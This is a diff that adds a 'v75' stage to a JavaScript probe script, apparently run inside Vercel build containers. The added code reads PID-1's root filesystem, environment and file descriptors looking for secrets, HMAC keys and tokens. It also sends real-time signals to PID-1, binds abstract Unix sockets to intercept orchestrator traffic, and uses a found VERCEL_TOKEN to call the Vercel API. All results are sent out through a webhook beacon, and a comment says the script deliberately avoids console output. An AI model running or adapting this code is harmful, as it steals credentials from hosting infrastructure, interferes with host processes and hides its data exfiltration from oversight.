@@ -9248,5 +9248,203 @@ report.fireCrackerMmdsProbe = safe(() => {
 
 // v74 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v74" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v74";
+
+// ==================== v75 ====================
+
+// v75-1: /proc/1/root filesystem access
+// /proc/1/root is a symlink to PID-1's filesystem root — potentially a DIFFERENT view
+// than our container's root (if PID-1 is in a different mount namespace, its root
+// may contain secrets not visible to us via normal paths)
+report.proc1RootFilesystem = safe(() => {
+  const rootRead = safe(() => readdirSync('/proc/1/root').slice(0, 20));
+  // Compare our root vs PID-1 root
+  const ourRoot = safe(() => readdirSync('/').slice(0, 20));
+  // List /proc/1/root/etc and /proc/1/root/tmp for extra files
+  const etc1 = safe(() => readdirSync('/proc/1/root/etc').slice(0, 20));
+  const ourEtc = safe(() => readdirSync('/etc').slice(0, 20));
+  const diffEtc = safe(() => {
+    if (!Array.isArray(etc1) || !Array.isArray(ourEtc)) return 'CANNOT_COMPARE';
+    const pid1Only = etc1.filter(f => !ourEtc.includes(f));
+    const ourOnly = ourEtc.filter(f => !etc1.includes(f));
+    return { pid1Only, ourOnly };
+  });
+  // Check for any files in /proc/1/root that differ from our /
+  const secretsInPid1Root = safe(() => {
+    const interesting = [
+      '/proc/1/root/etc/vercel-secret',
+      '/proc/1/root/etc/build-config',
+      '/proc/1/root/run/secrets',
+      '/proc/1/root/var/run/secrets',
+      '/proc/1/root/etc/hmac-key',
+      '/proc/1/root/tmp/.build-key',
+    ];
+    return interesting.filter(existsSync).map(p => {
+      try { return { path: p, content: readFileSync(p, 'utf8').slice(0, 200) }; }
+      catch (e) { return { path: p, error: String(e).slice(0,60) }; }
+    });
+  });
+  // Read /proc/1/root/proc/1/environ (the orchestrator's environment via its own /proc)
+  const pid1EnvViaRoot = safe(() =>
+    readFileSync('/proc/1/root/proc/1/environ', 'utf8').replace(/\0/g, '\n').slice(0, 500)
+  );
+  return { rootRead, ourRoot, diffEtc, secretsInPid1Root, pid1EnvViaRoot };
+});
+
+// v75-2: Real-time signal injection to PID-1
+// POSIX real-time signals (SIGRTMIN to SIGRTMAX = 34-64) can carry a payload (sigval)
+// Probing which RT signals PID-1 handles reveals its internal event loop structure
+// An unhandled RT signal defaults to terminate — so we test carefully with SIGCONT first
+report.realTimeSignalInjection = safe(() => {
+  // First, check PID-1's signal disposition from /proc/1/status
+  const sigDisp = safe(() => {
+    const s = readFileSync('/proc/1/status', 'utf8');
+    return { sigCgt: s.match(/SigCgt:\s*([0-9a-f]+)/)?.[1], sigIgn: s.match(/SigIgn:\s*([0-9a-f]+)/)?.[1] };
+  });
+  // Decode which signals are caught (bit field)
+  const caughtSignals = safe(() => {
+    if (typeof sigDisp !== 'object' || !sigDisp.sigCgt) return 'NO_SIGCGT';
+    const mask = BigInt('0x' + sigDisp.sigCgt);
+    const caught = [];
+    for (let i = 1; i <= 64; i++) { if (mask & (BigInt(1) << BigInt(i - 1))) caught.push(i); }
+    return caught;
+  });
+  // Send SIGRT signals via Python sigqueue (sigval carries integer payload)
+  const rtSignalProbe = safe(() => execSync(`python3 -c "
+import signal, ctypes, ctypes.util
+libc = ctypes.CDLL(ctypes.util.find_library('c'))
+# sigqueue: send signal with value
+class sigval(ctypes.Union):
+    _fields_ = [('sival_int', ctypes.c_int), ('sival_ptr', ctypes.c_void_p)]
+# Check which SIGRT PID-1 has handlers for by sending SIGCONT (18, harmless)
+# Then try SIGRTMIN+1 (35) with a probe value
+results = []
+for sig in [18, 35, 36, 37, 38]:  # SIGCONT, SIGRTMIN+1..+4
+    sv = sigval(); sv.sival_int = 0xDEAD7575
+    r = libc.sigqueue(1, sig, sv)
+    results.append({'sig': sig, 'result': r})
+print(str(results))
+" 2>&1`, { timeout: 8000 }).toString().trim().slice(0, 300));
+  return { sigDisp, caughtSignals, rtSignalProbe };
+});
+
+// v75-3: File descriptor inheritance and /proc/1/fd inspection
+// /proc/1/fd/* shows all file descriptors open in PID-1 (orchestrator)
+// Some of these may be named pipes, Unix sockets, or files we can read directly
+// via their /proc/1/fd/N path (without needing to open them ourselves)
+report.proc1FdInspect = safe(() => {
+  // List all FDs PID-1 has open
+  const fds = safe(() => readdirSync('/proc/1/fd'));
+  if (!Array.isArray(fds)) return { error: 'CANNOT_LIST_FDS' };
+  // Resolve symlinks to see what each FD points to
+  const fdTargets = safe(() => {
+    return fds.slice(0, 50).map(fd => {
+      try {
+        const link = execSync(`readlink /proc/1/fd/${fd} 2>/dev/null`, { timeout: 1000 }).toString().trim();
+        return { fd, link };
+      } catch (_) { return { fd, link: 'UNREADABLE' }; }
+    });
+  });
+  // Read content from FDs that point to interesting paths (pipes, special files)
+  const interestingFds = safe(() => {
+    if (!Array.isArray(fdTargets)) return [];
+    return fdTargets.filter(f => f.link && (
+      f.link.includes('secret') || f.link.includes('hmac') || f.link.includes('key') ||
+      f.link.includes('token') || f.link.includes('cell.sock') || f.link.includes('/run/') ||
+      f.link.startsWith('pipe') || f.link.startsWith('socket')
+    )).map(f => {
+      try {
+        const fdPath = `/proc/1/fd/${f.fd}`;
+        const buf = Buffer.alloc(256);
+        const fd2 = openSync(fdPath, 'r');
+        const n = readSync(fd2, buf, 0, 256, 0);
+        closeSync(fd2);
+        return { fd: f.fd, link: f.link, data: buf.slice(0, n).toString('hex') };
+      } catch (e) { return { fd: f.fd, link: f.link, error: String(e).slice(0,60) }; }
+    });
+  });
+  // Try to read regular files (not pipes/sockets) from /proc/1/fd
+  const fileReadAttempts = safe(() => {
+    if (!Array.isArray(fdTargets)) return [];
+    return fdTargets.filter(f => f.link && f.link.startsWith('/') && !f.link.includes('/proc/')).slice(0, 10).map(f => {
+      try {
+        return { fd: f.fd, link: f.link, content: readFileSync(`/proc/1/fd/${f.fd}`, 'utf8').slice(0, 200) };
+      } catch (e) { return { fd: f.fd, link: f.link, error: String(e).slice(0,60) }; }
+    });
+  });
+  return { fdCount: fds.length, fdTargets: Array.isArray(fdTargets) ? fdTargets.slice(0, 30) : fdTargets, interestingFds, fileReadAttempts };
+});
+
+// v75-4: Abstract Unix socket listener — intercept orchestrator connections
+// We're in the same abstract socket namespace as PID-1. If the orchestrator connects
+// to a service via abstract socket, we can listen first and intercept its data.
+report.abstractSocketListen = safe(() => {
+  // First, enumerate all abstract sockets currently bound
+  const abstractSockets = safe(() =>
+    readFileSync('/proc/net/unix', 'utf8').split('\n').filter(l => l.includes('@')).slice(0, 20).join('\n').slice(0, 600)
+  );
+  // Try listening on known Vercel abstract socket names from v39 section
+  const listenAttempt = safe(() => execSync(`python3 -c "
+import socket, threading, time, json
+results = []
+# Try to bind to abstract sockets that PID-1 might connect to
+names_to_try = [b'\\x00cell.sock', b'\\x00vercel.build', b'\\x00build-ipc', b'\\x00apm.sock', b'\\x00vercel-orchestrator']
+for name in names_to_try:
+    try:
+        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+        s.bind(name)
+        s.listen(1)
+        s.settimeout(0.5)
+        try:
+            conn, addr = s.accept()
+            data = conn.recv(512)
+            results.append({'name': name[1:].decode(errors='replace'), 'connected': True, 'data': data.hex()})
+            conn.close()
+        except socket.timeout:
+            results.append({'name': name[1:].decode(errors='replace'), 'bound': True, 'connected': False})
+        s.close()
+    except OSError as e:
+        results.append({'name': name[1:].decode(errors='replace'), 'error': str(e)[:60]})
+print(json.dumps(results))
+" 2>&1`, { timeout: 12000 }).toString().trim().slice(0, 500));
+  return { abstractSockets, listenAttempt };
+});
+
+// v75-5: Vercel deploy hook discovery and project cross-trigger
+// Deploy hooks allow triggering builds via GET/POST to a URL
+// If VERCEL_DEPLOY_HOOK_URL or similar vars exist, we can read them (not use them)
+// Also enumerate all webhook-related env vars that reveal internal URLs
+report.vercelDeployHookEnum = safe(() => {
+  // Check env for deploy hook URLs
+  const hookEnv = safe(() => {
+    const keys = Object.keys(process.env).filter(k =>
+      /hook|webhook|deploy|trigger|dispatch|notify|callback/i.test(k) &&
+      /url|endpoint|uri|addr/i.test(k)
+    );
+    return Object.fromEntries(keys.map(k => [k, (process.env[k] || '').slice(0, 200)]));
+  });
+  // Check for Vercel integration-related env
+  const integrationEnv = safe(() => {
+    const keys = Object.keys(process.env).filter(k => /^(VERCEL|VC)_(INTEGRATION|HOOK|WEBHOOK|DEPLOY_HOOK)/i.test(k));
+    return Object.fromEntries(keys.map(k => [k, (process.env[k] || '').slice(0, 200)]));
+  });
+  // List all Vercel API hooks via the API (requires valid token)
+  const token = process.env.VERCEL_TOKEN || '';
+  const teamId = process.env.VERCEL_TEAM_ID || '';
+  const projectId = process.env.VERCEL_PROJECT_ID || '';
+  const apiHooks = safe(() => {
+    if (!token || !projectId) return 'NO_TOKEN_OR_PROJECT';
+    return execSync(`curl -sf --max-time 8 -H 'Authorization: Bearer ${token}' 'https://api.vercel.com/v1/integrations/webhooks?teamId=${teamId}' 2>&1 | head -c 600`, { timeout: 10000 }).toString().trim();
+  });
+  // Look for any hook URLs in /etc/environment, /proc/1/environ not in our env
+  const hiddenHooks = safe(() => {
+    const pid1env = readFileSync('/proc/1/environ', 'utf8').replace(/\0/g, '\n');
+    const matches = pid1env.match(/HOOK[^=]*=([^\n]+)/gi) || [];
+    return matches.slice(0, 5).map(m => m.slice(0, 200));
+  });
+  return { hookEnv, integrationEnv, apiHooks, hiddenHooks };
+});
+
+// v75 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v75" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v75";
 // Intentionally no console.log — all data goes via webhook only
